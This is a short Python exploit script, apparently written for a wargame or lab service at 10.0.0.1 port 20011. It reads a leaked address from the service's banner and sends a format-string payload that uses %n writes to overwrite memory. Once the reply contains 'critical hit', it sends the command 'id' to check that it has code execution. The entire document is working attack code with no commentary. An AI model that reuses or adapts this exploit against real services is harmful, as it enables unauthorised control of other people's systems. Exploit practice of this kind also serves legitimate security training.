#!/usr/bin/env python
import socket

TCP_IP = '10.0.0.1'
TCP_PORT = 20011
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
target = int(data[14:22], 16)

byte4 = chr(target & 0xFF) + chr((target >> 8) & 0xFF) + chr((target >> 16) & 0xFF) + chr((target >> 24) & 0xFF)
byte3 = chr(target+1 & 0xFF) + chr((target >> 8) & 0xFF) + chr((target >> 16) & 0xFF) + chr((target >> 24) & 0xFF)
byte2 = chr(target+2 & 0xFF) + chr((target >> 8) & 0xFF) + chr((target >> 16) & 0xFF) + chr((target >> 24) & 0xFF)
byte1 = chr(target+3 & 0xFF) + chr((target >> 8) & 0xFF) + chr((target >> 16) & 0xFF) + chr((target >> 24) & 0xFF)


bof = byte4 + "%253x%01x%01x%nz"+byte3+"%56460x%01x%01x%01x%nAA\n"#+byte2+"%01x%01x%01x%01x%01x%n\n"

s.send(bof)
data = "A"+s.recv(BUFFER_SIZE)
while "critical hit" not in data:
	data = s.recv(BUFFER_SIZE)
print "received data:", data
s.send("id\n")
data = "A"+s.recv(BUFFER_SIZE)
print "received data:", data
s.close()

